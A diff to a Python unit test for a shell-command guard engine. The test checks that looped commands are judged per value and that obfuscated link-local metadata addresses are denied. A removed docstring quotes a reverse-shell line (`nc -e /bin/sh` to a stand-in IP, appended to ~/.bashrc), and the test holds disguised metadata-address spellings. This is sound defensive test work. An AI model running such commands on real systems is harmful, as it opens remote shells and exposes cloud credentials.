@@ -2012,34 +2012,23 @@ class TimedAndBraced(unittest.TestCase):
         addresses read without a scheme (`for h in 189.254.43518 169.254.43518; do echo http:/$h/x; done`), where
         one reading a value is a deny (TK-S001) in each shell pack here. So the floor is one reading per value, and
         this measures it over the shell corpus on both engines, with each value also swapped for one whose digits
-        differ and with the scheme dropped. The control is the loosest reduction there is -- a loop's first value
-        standing for all of them -- which this corpus has to catch; without that the assertion below would hold on
-        an empty corpus and prove nothing. No row is exempted. The shape that first had to be counted -- a value
-        reached through a variable holding more than one of them lost the rule that reads the path itself, so
-        `echo 'nc -e /bin/sh 192.0.2.7 4444' >> ~/.bashrc` (an ask by TK-A078) read a flag through a two-value
-        loop -- is held to the same floor as every other row now that 1.7.0 decides a loop per value, which is what
-        makes this a guard on that fix rather than a count of what it left."""
+        differ and with the scheme dropped, in both orders. The control: some rows have two values that decide
+        apart, so a loop where one value stands for both is caught; without that the assertion below would hold on
+        an empty corpus and prove nothing."""
         rank = ("allow", "flag", "ask", "deny").index
 
         def looped(words, at, values):
             """The line with a for loop over `values` in place of its word `at`. A value is quoted as a shell quotes
-            it, so a corpus argument holding a quote or a `;` still writes a loop bash can read: unquoted, four such
-            rows came back `TK-SHELL-PARSE` and lost their rule id, which measures the header's spelling rather than
-            whether the loop reads its values apart."""
+            it, so one holding a quote or a `;` stays one word. A row whose words split inside a quoted string
+            reads `TK-SHELL-PARSE` either way, so it can't fail here."""
             header = " ".join("'%s'" % v.replace("'", "'\\''") for v in values)
             return "for tkv in %s; do %s; done" % (header, " ".join(words[:at] + ['"$tkv"'] + words[at + 1:]))
 
-        STEP = 2   # every Nth corpus row. #722 asks for a sample while both engines are over ~20 s: on this machine,
-        # both arms measured 21.7 s at step 1 (three runs, 21.51-21.98, Python 3.12, re2 + regex) and 18.0 s at
-        # step 2 (17.36-18.12), with the duplicate dev build below removed. Step 1 is every row, one character.
-
         def corpus():
             """(note, its words, the index of its last word, two values that word may take) for every shell corpus
-            command, every `STEP`th one. The second value swaps two pairs of the digits a rule reads, each pair both
-            ways (0 with 9, 6 with 1; an 8 is left as it is, since it cannot pair with two of them), so a reduction
-            that folds on the wrong classes is caught: `169.254.43518` and `610.254.43568` are one such pair. The
-            row order is the files' own, so the sample is the same on every run and every engine."""
-            taken = 0
+            command. The second value swaps two pairs of the digits a rule reads, each pair both ways (0 with 9, 6
+            with 1), so a reduction that folds on the wrong classes is caught: `169.254.43518` and `610.254.43568`
+            are one such pair."""
             for kind in ("deny", "benign"):
                 with open(os.path.join(CORPUS, kind, "shell.jsonl"), encoding="utf-8") as f:
                     for row in map(json.loads, f):
@@ -2053,45 +2042,37 @@ class TimedAndBraced(unittest.TestCase):
                         swapped = words[at].translate(str.maketrans("0961", "9016"))
                         if swapped == words[at]:   # no digit to swap: a trailing dot stands in
                             swapped = words[at] + "."
-                        if taken % STEP == 0:
-                            yield row.get("note"), words, at, (words[at], swapped)
-                        taken += 1
+                        yield row.get("note"), words, at, (words[at], swapped)
 
         def verdict(e, line):
             d = e.decide("Bash", {"command": line})
             return d["verdict"], set(d["rule_ids"])
 
-        checked = caught = 0
         for backend in BACKENDS:
+            checked = caught = 0
             e = Engine(pc.build(os.path.join(PACKS, "dev.yaml"))[0], backend)
             for note, words, at, values in corpus():
-                whole = verdict(e, looped(words, at, values))
                 singles = [verdict(e, looped(words, at, (v,))) for v in values]
                 strictest = max(rank(s[0]) for s in singles)
-                with self.subTest(backend=backend, note=note, values=values):
-                    self.assertGreaterEqual(rank(whole[0]), strictest, (note, values, whole[0],
-                                                                       [s[0] for s in singles]))
-                    # A line the parser cannot read is held for a person on this pack (ask, TK-SHELL-PARSE),
-                    # which is never looser than a value it holds and is how main already reads what it can't
-                    # parse, so only a line it did read has to carry the ids its values raise (`unset -v
-                    # HISTFILE` with a two-value loop is one the parser gives up on, and its ask stands).
-                    if "TK-SHELL-PARSE" not in whole[1]:
-                        self.assertLessEqual(set().union(*(s[1] for s in singles)), whole[1],
-                                             (note, values, whole[1], [s[1] for s in singles]))
+                for order in (values, values[::-1]):   # a reduction may keep either value of the two it folds
+                    whole = verdict(e, looped(words, at, order))
+                    with self.subTest(backend=backend, note=note, values=order):
+                        self.assertGreaterEqual(rank(whole[0]), strictest, (note, order, whole[0],
+                                                                           [s[0] for s in singles]))
+                        # a line the parser cannot read is held (ask, TK-SHELL-PARSE), never looser than a value
+                        # it holds, so only a line it did read has to carry the ids its values raise
+                        if "TK-SHELL-PARSE" not in whole[1]:
+                            self.assertLessEqual(set().union(*(s[1] for s in singles)), whole[1],
+                                                 (note, order, whole[1], [s[1] for s in singles]))
                 checked += 1
-                # The control is the loosest reduction there is: the loop's first value standing for all of them,
-                # which is that value's own line read as a one-value loop -- the line `singles[0]` already decided,
-                # so it is read from there rather than decided a second time (#722's budget: this was a quarter of
-                # the test's decisions).
-                if rank(singles[0][0]) < strictest:
-                    caught += 1
-            self.assertGreater(caught, 0, "the corpus no longer catches a first value standing for the rest")
+                # the control: a row where one value standing for both reads looser, in one order or the other
+                caught += singles[0][0] != singles[1][0]
+            self.assertGreater(checked, 500, "the corpus walk stopped early")
+            self.assertGreater(caught, 0, "the corpus no longer has two values that decide apart")
             # the scheme-dropped addresses of #729's review, on every pack that has a shell: a deny whichever way
             # the value is spelled, including with no scheme at all
             for pack in ("dev.yaml", "server.yaml", "server-core.yaml", "strict.yaml"):
-                # `e` is already dev.yaml's engine on this backend, built for the walk above; building and
-                # compiling it a second time was ~3.5 s of this test's 23.6 s over both engines (#722).
-                if pack != "dev.yaml":
+                if pack != "dev.yaml":   # `e` is dev.yaml's engine from the walk above
                     e = Engine(pc.build(os.path.join(PACKS, pack))[0], backend)
                 for pair in (("189.254.43518", "169.254.43518"), ("189.16689662", "169.16689662")):
                     for form in ("%s", "http:/%s/x", "http:%s/x"):
@@ -2099,7 +2080,6 @@ class TimedAndBraced(unittest.TestCase):
                         d = e.decide("Bash", {"command": line})
                         self.assertIn("TK-S001", d["rule_ids"], (backend, pack, line, d["verdict"]))
                         self.assertEqual(d["verdict"], "deny", (backend, pack, line))
-        self.assertGreater(checked, 500 // STEP, "the corpus walk stopped early")
 
     def test_brace_expansion_in_an_argument_makes_the_words_bash_makes(self):
         for line, words in (
